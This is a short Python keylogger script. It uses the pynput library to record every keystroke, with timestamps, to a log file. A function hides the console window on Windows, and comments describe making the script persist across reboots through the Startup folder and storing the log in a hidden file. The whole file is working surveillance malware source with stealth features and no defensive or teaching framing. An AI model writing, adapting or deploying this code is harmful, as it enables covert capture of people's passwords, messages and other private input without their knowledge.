import os
import sys
from pynput import keyboard
from datetime import datetime

#Persist Across Reboots:
#Add the script to the Startup folder:
#C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startupss

# Configuration
#LOG_FILE = os.path.expanduser("~/.keystrokes.log")  # Hidden log file
LOG_FILE = "keyloggeroutput.txt" # Enter file path here

def on_press(key):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a") as f:
            f.write(f"{timestamp} - {key.char}\n")
    except AttributeError:
        # Handle special keys (e.g., Shift, Ctrl)
        with open(LOG_FILE, "a") as f:
            f.write(f"{timestamp} - {key}\n")

def hide_script():
    # Hide the script window (Windows-specific)
    if sys.platform == "win32":
        import win32gui, win32con
        win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)

if __name__ == "__main__":
    hide_script()  # Hide the window
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()